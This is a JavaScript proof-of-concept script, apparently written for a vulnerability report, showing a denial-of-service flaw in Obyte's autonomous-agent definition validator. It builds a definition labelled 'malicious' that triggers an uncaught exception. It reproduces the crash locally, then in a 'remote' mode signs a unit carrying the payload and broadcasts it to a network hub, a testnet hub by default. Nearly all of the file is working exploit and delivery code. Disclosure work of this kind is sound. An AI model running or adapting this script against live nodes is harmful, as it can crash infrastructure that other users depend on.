'use strict';

const crypto = require('crypto');
const _ = require('lodash');
const async = require('async');
const ecdsa = require('secp256k1');
const base32 = require('thirty-two');

// ---------------------------------------------------------------------------
// Extracted helpers (string_utils.js, chash.js, object_hash.js, object_length.js)
// ---------------------------------------------------------------------------

function toWellFormedJsonStringify(obj) {
	var str = JSON.stringify(obj);
	return str.replace(/[\ud800-\udfff]/g, chr => "\\u" + chr.codePointAt(0).toString(16));
}

function getJsonSourceString(obj) {
	let cache = new WeakMap();
	function stringify(variable) {
		if (variable === null)
			throw Error("null value in " + JSON.stringify(obj));
		switch (typeof variable) {
			case "string":
				return toWellFormedJsonStringify(variable);
			case "number":
				if (!isFinite(variable))
					throw Error("invalid number: " + variable);
			case "boolean":
				return variable.toString();
			case "object":
				if (cache.has(variable))
					return cache.get(variable);
				let result;
				if (Array.isArray(variable)) {
					if (variable.length === 0)
						throw Error("empty array in " + JSON.stringify(obj));
					result = '[' + variable.map(stringify).join(',') + ']';
				}
				else {
					var keys = Object.keys(variable).sort();
					if (keys.length === 0)
						throw Error("empty object in " + JSON.stringify(obj));
					result = '{' + keys.map(function (key) { return toWellFormedJsonStringify(key) + ':' + stringify(variable[key]) }).join(',') + '}';
				}
				cache.set(variable, result);
				return result;
		}
	}
	return stringify(obj);
}

var STRING_JOIN_CHAR = "\x00";
function getSourceString(obj) {
	var arrComponents = [];
	function extractComponents(variable) {
		if (variable === null)
			throw Error("null value in " + JSON.stringify(obj));
		switch (typeof variable) {
			case "string":
				arrComponents.push("s", variable);
				break;
			case "number":
				arrComponents.push("n", variable.toString());
				break;
			case "boolean":
				arrComponents.push("b", variable.toString());
				break;
			case "object":
				if (Array.isArray(variable)) {
					arrComponents.push('[');
					for (var i = 0; i < variable.length; i++)
						extractComponents(variable[i]);
					arrComponents.push(']');
				}
				else {
					var keys = Object.keys(variable).sort();
					if (keys.length === 0)
						throw Error("empty object in " + JSON.stringify(obj));
					keys.forEach(function (key) {
						arrComponents.push(key);
						extractComponents(variable[key]);
					});
				}
				break;
		}
	}
	extractComponents(obj);
	return arrComponents.join(STRING_JOIN_CHAR);
}

// chash.js
var PI = "14159265358979323846264338327950288419716939937510";
var arrRelativeOffsets = PI.split("");

function calcOffsets(chash_length) {
	var arrOffsets = [];
	var offset = 0;
	var index = 0;
	for (var i = 0; offset < chash_length; i++) {
		var relative_offset = parseInt(arrRelativeOffsets[i]);
		if (relative_offset === 0) continue;
		offset += relative_offset;
		if (chash_length === 288) offset += 4;
		if (offset >= chash_length) break;
		arrOffsets.push(offset);
		index++;
	}
	return arrOffsets;
}

var arrOffsets160 = calcOffsets(160);

function buffer2bin(buf) {
	var bytes = [];
	for (var i = 0; i < buf.length; i++) {
		var bin = buf[i].toString(2);
		if (bin.length < 8) bin = "00000000".substring(bin.length, 8) + bin;
		bytes.push(bin);
	}
	return bytes.join("");
}

function bin2buffer(bin) {
	var len = bin.length / 8;
	var buf = Buffer.alloc(len);
	for (var i = 0; i < len; i++)
		buf[i] = parseInt(bin.substr(i * 8, 8), 2);
	return buf;
}

function getChecksum(clean_data) {
	var full_checksum = crypto.createHash("sha256").update(clean_data).digest();
	return Buffer.from([full_checksum[5], full_checksum[13], full_checksum[21], full_checksum[29]]);
}

function mixChecksumIntoCleanData(binCleanData, binChecksum) {
	var arrOffsets = arrOffsets160;
	var arrFrags = [];
	var arrChecksumBits = binChecksum.split("");
	var start = 0;
	for (var i = 0; i < arrOffsets.length; i++) {
		var end = arrOffsets[i] - i;
		arrFrags.push(binCleanData.substring(start, end));
		arrFrags.push(arrChecksumBits[i]);
		start = end;
	}
	if (start < binCleanData.length)
		arrFrags.push(binCleanData.substring(start));
	return arrFrags.join("");
}

function getChash160(data) {
	var hash = crypto.createHash("ripemd160").update(data, "utf8").digest();
	var truncated_hash = hash.slice(4);
	var checksum = getChecksum(truncated_hash);
	var binCleanData = buffer2bin(truncated_hash);
	var binChecksum = buffer2bin(checksum);
	var binChash = mixChecksumIntoCleanData(binCleanData, binChecksum);
	var chash = bin2buffer(binChash);
	return base32.encode(chash).toString();
}

// object_hash.js
function objectHash_getChash160(obj) {
	var sourceString = (Array.isArray(obj) && obj.length === 2 && obj[0] === 'autonomous agent')
		? getJsonSourceString(obj)
		: getSourceString(obj);
	return getChash160(sourceString);
}

function getBase64Hash(obj, bJsonBased) {
	var sourceString = bJsonBased ? getJsonSourceString(obj) : getSourceString(obj);
	return crypto.createHash("sha256").update(sourceString, "utf8").digest("base64");
}

function getNakedUnit(objUnit) {
	var objNakedUnit = _.cloneDeep(objUnit);
	delete objNakedUnit.unit;
	delete objNakedUnit.headers_commission;
	delete objNakedUnit.payload_commission;
	delete objNakedUnit.oversize_fee;
	delete objNakedUnit.actual_tps_fee;
	delete objNakedUnit.main_chain_index;
	if (objNakedUnit.messages) {
		for (var i = 0; i < objNakedUnit.messages.length; i++) {
			delete objNakedUnit.messages[i].payload;
			delete objNakedUnit.messages[i].payload_uri;
		}
	}
	return objNakedUnit;
}

function getUnitContentHash(objUnit) {
	return getBase64Hash(getNakedUnit(objUnit), true);
}

function getUnitHash(objUnit) {
	return getBase64Hash(getStrippedUnit(objUnit), true);
}

function getStrippedUnit(objUnit) {
	var objStrippedUnit = {
		content_hash: getUnitContentHash(objUnit),
		version: objUnit.version,
		alt: objUnit.alt,
		authors: objUnit.authors.map(function (author) { return { address: author.address }; }),
	};
	if (objUnit.witness_list_unit)
		objStrippedUnit.witness_list_unit = objUnit.witness_list_unit;
	else if (objUnit.witnesses)
		objStrippedUnit.witnesses = objUnit.witnesses;
	if (objUnit.parent_units) {
		objStrippedUnit.parent_units = objUnit.parent_units;
		objStrippedUnit.last_ball = objUnit.last_ball;
		objStrippedUnit.last_ball_unit = objUnit.last_ball_unit;
	}
	objStrippedUnit.timestamp = objUnit.timestamp;
	return objStrippedUnit;
}

function getUnitHashToSign(objUnit) {
	var objNakedUnit = getNakedUnit(objUnit);
	for (var i = 0; i < objNakedUnit.authors.length; i++)
		delete objNakedUnit.authors[i].authentifiers;
	return crypto.createHash("sha256").update(getJsonSourceString(objNakedUnit), "utf8").digest();
}

// object_length.js
var PARENT_UNITS_SIZE = 2 * 44;
var PARENT_UNITS_KEY_SIZE = "parent_units".length;

function getLength(value, bWithKeys) {
	let cache = new WeakMap();
	function _getLength(value) {
		if (value === null) return 0;
		switch (typeof value) {
			case "string": return value.length;
			case "number": return 8;
			case "object":
				if (cache.has(value)) return cache.get(value);
				var len = 0;
				if (Array.isArray(value))
					value.forEach(function (element) { len += _getLength(element); });
				else
					for (var key in value) {
						if (bWithKeys) len += key.length;
						len += _getLength(value[key]);
					}
				cache.set(value, len);
				return len;
			case "boolean": return 1;
		}
	}
	return _getLength(value);
}

function getHeadersSize(objUnit) {
	var objHeader = _.cloneDeep(objUnit);
	delete objHeader.unit;
	delete objHeader.headers_commission;
	delete objHeader.payload_commission;
	delete objHeader.oversize_fee;
	delete objHeader.actual_tps_fee;
	delete objHeader.main_chain_index;
	delete objHeader.messages;
	delete objHeader.parent_units;
	return getLength(objHeader, true) + PARENT_UNITS_SIZE + PARENT_UNITS_KEY_SIZE;
}

function getTotalPayloadSize(objUnit) {
	return getLength({ messages: objUnit.messages }, true);
}

// ---------------------------------------------------------------------------
// Keypair and signing
// ---------------------------------------------------------------------------

function generateKeypair() {
	let privkey;
	do {
		privkey = crypto.randomBytes(32);
	} while (!ecdsa.privateKeyVerify(privkey));
	var pubkey = Buffer.from(ecdsa.publicKeyCreate(privkey));
	return { privkey: privkey, pubkey_b64: pubkey.toString('base64') };
}

function signUnit(objUnit, privkey) {
	var hash = getUnitHashToSign(objUnit);
	var res = ecdsa.ecdsaSign(hash, privkey);
	return Buffer.from(res.signature).toString("base64");
}

// ---------------------------------------------------------------------------
// Malicious AA definition
// ---------------------------------------------------------------------------
// validate() processes the {if: "{1}"} object: validates formula, deletes .if
// and .init keys, re-enters validate() on the resulting empty object {}.
// {} fails isNonemptyObject (Object.keys({}).length === 0), falls to:
//   throw Error('unknown type of value in ' + name)
// This synchronous throw inside the async callback chain is uncaught.

function buildAADefinition() {
	return ["autonomous agent", {
		"bounce_fees": { "base": 10000 },
		"messages": [{
			"app": "data",
			"payload": {
				"x": { "if": "{1}" }
			}
		}]
	}];
}

// ---------------------------------------------------------------------------
// Test 1: Local crash reproduction
// ---------------------------------------------------------------------------
// Runs the exact validate() code path from aa_validation.js to prove the
// uncaught throw. Mocks only the formula validator (irrelevant to crash).

function testLocalCrash() {
	var isNonemptyObject = function (obj) {
		return (typeof obj === 'object' && !Array.isArray(obj) && obj !== null && Object.keys(obj).length > 0);
	};
	var getFormula = function (s) {
		if (typeof s !== 'string') return null;
		var m = s.match(/^\{(.+)\}$/s);
		return m ? m[1] : null;
	};
	var hasCases = function (v) {
		return (typeof v === 'object' && v !== null && !Array.isArray(v) && Array.isArray(v.cases));
	};
	var validateFormula = function (_opts, cb) { cb(); };

	// aa_validation.js lines 573-685 (verbatim logic)
	function validate(obj, name, path, locals, depth, cb, bValueOnly) {
		if (depth > 100) return cb("max depth reached");
		locals = _.cloneDeep(locals);
		var value = obj[name];
		if (typeof name === 'string' && !bValueOnly) {
			var f = getFormula(name);
			if (f !== null) {
				return validateFormula({ formula: f, locals: _.cloneDeep(locals) }, function (err) {
					if (err) return cb(err);
					validate(obj, name, path, locals, depth, cb, true);
				});
			}
		}
		if (typeof value === 'number' || typeof value === 'boolean')
			return cb();
		if (typeof value === 'string') {
			var f = getFormula(value);
			if (f === null) return cb();
			validateFormula({ formula: f, locals: locals }, cb);
		}
		else if (hasCases(value)) {
			if (typeof name === 'string')
				path = path.substring(0, path.length - name.length - 1);
			async.eachOfSeries(value.cases, function (acase, i, cb2) {
				if (typeof acase[name] === 'undefined')
					return cb2('case ' + i + ' has no field ' + name);
				validate(value.cases, i, path, _.cloneDeep(locals), depth + 1, cb2);
			}, cb);
		}
		// -- crash trigger block --
		else if (typeof value === 'object' && (typeof value.if === 'string' || typeof value.init === 'string')) {
			(function evaluateIf(cb2) {
				if (typeof value.if !== 'string') return cb2();
				var f = getFormula(value.if);
				if (f === null) return cb2("if is not a formula: " + value.if);
				validateFormula({ formula: f, locals: locals }, cb2);
			})(function (err) {
				if (err) return cb(err);
				(function evaluateInit(cb2) {
					if (typeof value.init !== 'string') return cb2();
					var f = getFormula(value.init);
					if (f === null) return cb2("init is not a formula: " + value.init);
					validateFormula({ formula: f, locals: locals, bStatementsOnly: true }, cb2);
				})(function (err) {
					if (err) return cb(err);
					delete value.if;
					delete value.init;
					validate(obj, name, path, locals, depth, cb);
				});
			});
		}
		else if (Array.isArray(value)) {
			async.eachOfSeries(value, function (elem, i, cb2) {
				validate(value, i, path, _.cloneDeep(locals), depth + 1, cb2);
			}, cb);
		}
		else if (isNonemptyObject(value)) {
			async.eachSeries(Object.keys(value), function (key, cb2) {
				validate(value, key, path + '/' + key, _.cloneDeep(locals), depth + 1, cb2);
			}, cb);
		}
		else
			throw Error('unknown type of value in ' + name);
	}

	var defCopy = _.cloneDeep(buildAADefinition());

	// entry: validateDefinition -> validate(arrDefinition, 1, '', {}, 0, cb)
	var caught = false;
	try {
		validate(defCopy, 1, '', {}, 0, function () {});
	}
	catch (e) {
		caught = true;
		console.log('[PASS] ' + e.message);
	}

	if (!caught) {
		process.once('uncaughtException', function (e) {
			console.log('[PASS] ' + e.message);
			process.exit(0);
		});
		setTimeout(function () {
			console.log('[FAIL] no crash');
			process.exit(1);
		}, 3000);
	}
}

// ---------------------------------------------------------------------------
// Test 2: Network delivery
// ---------------------------------------------------------------------------
// Connects to testnet hub, fetches network state, constructs a signed unit
// carrying the malicious AA definition, and transmits it.

function testNetwork(hubUrl) {
	var WebSocket = require('ws');
	var wsOpts = {};
	if (process.env.HTTPS_PROXY || process.env.https_proxy) {
		var { HttpsProxyAgent } = require('https-proxy-agent');
		wsOpts.agent = new HttpsProxyAgent(process.env.HTTPS_PROXY || process.env.https_proxy);
	}
	var ws = new WebSocket(hubUrl, wsOpts);
	var tagCounter = 0;
	var pendingRequests = {};

	function sendRequest(command, params) {
		return new Promise(function (resolve, reject) {
			var tag = 'tag_' + (tagCounter++);
			pendingRequests[tag] = resolve;
			ws.send(JSON.stringify(['request', { command: command, params: params, tag: tag }]));
			setTimeout(function () {
				if (pendingRequests[tag]) {
					delete pendingRequests[tag];
					reject(new Error('timeout: ' + command));
				}
			}, 15000);
		});
	}

	function sendJustsaying(subject, body) {
		ws.send(JSON.stringify(['justsaying', { subject: subject, body: body }]));
	}

	ws.on('message', function (data) {
		var msg;
		try { msg = JSON.parse(data.toString()); } catch (e) { return; }
		if (msg[0] === 'response' && msg[1] && msg[1].tag && pendingRequests[msg[1].tag]) {
			var resolve = pendingRequests[msg[1].tag];
			delete pendingRequests[msg[1].tag];
			resolve(msg[1]);
		}
	});

	ws.on('close', function (code) {
		console.log('[INFO] ws closed (' + code + ')');
	});

	ws.on('error', function (err) {
		console.log('[ERROR] ' + err.message);
	});

	ws.on('open', function () {
		run().catch(function (e) {
			console.log('[ERROR] ' + e.message);
			ws.close();
		});
	});

	async function run() {
		// fetch witnesses
		var wResp = await sendRequest('get_witnesses', null);
		var witnesses = wResp.response || wResp;
		if (!Array.isArray(witnesses) || witnesses.length === 0)
			throw new Error('no witnesses');

		// fetch last stable unit
		var sResp = await sendRequest('get_last_stable_unit_props', null);
		var sProps = sResp.response || sResp;
		if (!sProps || !sProps.unit)
			throw new Error('no stable unit');

		// fetch that joint
		var jResp = await sendRequest('get_joint', sProps.unit);
		var jData = jResp.response || jResp;
		var joint = jData.joint;
		if (!joint || !joint.unit)
			throw new Error('no joint data');

		var refUnit = joint.unit;

		// resolve parent and ball references from the fetched stable joint
		var parentUnit = refUnit.unit;
		var lastBall = joint.ball || refUnit.last_ball;
		var lastBallUnit = joint.ball ? parentUnit : refUnit.last_ball_unit;
		if (!lastBall) {
			lastBall = refUnit.last_ball;
			lastBallUnit = refUnit.last_ball_unit;
		}

		// build unit
		var kp = generateKeypair();
		var authorDef = ["sig", { "pubkey": kp.pubkey_b64 }];
		var authorAddress = objectHash_getChash160(authorDef);

		var aaDef = buildAADefinition();
		var aaAddress = objectHash_getChash160(aaDef);
		var payload = { address: aaAddress, definition: aaDef };
		var payloadHash = getBase64Hash(payload, true);

		var objUnit = {
			version: '4.0t',
			alt: '2',
			timestamp: Math.round(Date.now() / 1000),
			parent_units: [parentUnit].sort(),
			last_ball: lastBall,
			last_ball_unit: lastBallUnit,
			authors: [{
				address: authorAddress,
				definition: authorDef,
				authentifiers: {}
			}],
			messages: [{
				app: 'definition',
				payload_hash: payloadHash,
				payload: payload
			}]
		};

		// use witness_list_unit from the reference joint if available
		if (refUnit.witness_list_unit)
			objUnit.witness_list_unit = refUnit.witness_list_unit;
		else
			objUnit.witnesses = witnesses;

		objUnit.headers_commission = getHeadersSize(objUnit);
		objUnit.payload_commission = getTotalPayloadSize(objUnit);
		objUnit.authors[0].authentifiers = { r: signUnit(objUnit, kp.privkey) };
		objUnit.unit = getUnitHash(objUnit);

		console.log('[INFO] unit: ' + objUnit.unit);
		console.log('[INFO] author: ' + authorAddress);
		console.log('[INFO] aa_addr: ' + aaAddress);
		console.log('[INFO] parent: ' + parentUnit);
		console.log('[INFO] sending...');

		sendJustsaying('joint', { unit: objUnit });

		// collect response
		var done = false;
		var handler = function (data) {
			if (done) return;
			var msg;
			try { msg = JSON.parse(data.toString()); } catch (e) { return; }
			if (msg[0] === 'justsaying' && msg[1]) {
				var subj = msg[1].subject;
				var body = msg[1].body;
				if (subj === 'error' || subj === 'result' || subj === 'info') {
					done = true;
					console.log('[RESULT] ' + JSON.stringify(body));
				}
			}
		};
		ws.on('message', handler);

		setTimeout(function () {
			ws.removeListener('message', handler);
			if (!done)
				console.log('[INFO] no response within timeout');
			ws.close();
		}, 10000);
	}
}


// ---------------------------------------------------------------------------
// Test 3: Hash computation verification
// ---------------------------------------------------------------------------
// Validates that all extracted hash/address functions produce correct output.

function testHashes() {
	var def = buildAADefinition();
	var aaAddr = objectHash_getChash160(def);
	if (aaAddr.length !== 32) throw Error('bad aa address length');

	var payload = { address: aaAddr, definition: def };
	var payloadHash = getBase64Hash(payload, true);
	if (payloadHash.length !== 44) throw Error('bad payload hash length');

	var kp = generateKeypair();
	var authorDef = ["sig", { "pubkey": kp.pubkey_b64 }];
	var authorAddr = objectHash_getChash160(authorDef);
	if (authorAddr.length !== 32) throw Error('bad author address length');

	var objUnit = {
		version: '4.0t', alt: '2', timestamp: Math.round(Date.now() / 1000),
		parent_units: ['AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='],
		last_ball: 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=',
		last_ball_unit: 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=',
		witness_list_unit: 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD=',
		authors: [{ address: authorAddr, definition: authorDef, authentifiers: {} }],
		messages: [{ app: 'definition', payload_hash: payloadHash, payload: payload }]
	};

	objUnit.headers_commission = getHeadersSize(objUnit);
	objUnit.payload_commission = getTotalPayloadSize(objUnit);
	if (typeof objUnit.headers_commission !== 'number') throw Error('bad headers_commission');
	if (typeof objUnit.payload_commission !== 'number') throw Error('bad payload_commission');

	objUnit.authors[0].authentifiers = { r: signUnit(objUnit, kp.privkey) };
	objUnit.unit = getUnitHash(objUnit);
	if (objUnit.unit.length !== 44) throw Error('bad unit hash length');

	console.log('[PASS] aa_addr=' + aaAddr + ' unit=' + objUnit.unit + ' hdr=' + objUnit.headers_commission + ' pld=' + objUnit.payload_commission);
}

// ---------------------------------------------------------------------------
// Entry
// ---------------------------------------------------------------------------

var mode = process.argv[2] || 'local';
var hubUrl = process.argv[3] || 'wss://obyte.org/bb-test';

if (mode === 'local') {
	console.log('--- local crash reproduction ---');
	testLocalCrash();
}
else if (mode === 'remote') {
	console.log('--- network delivery (' + hubUrl + ') ---');
	testNetwork(hubUrl);
}
else if (mode === 'verify') {
	console.log('--- hash verification ---');
	testHashes();
}
else {
	console.log('usage: node poc.js [local|remote|verify] [hub_url]');
}
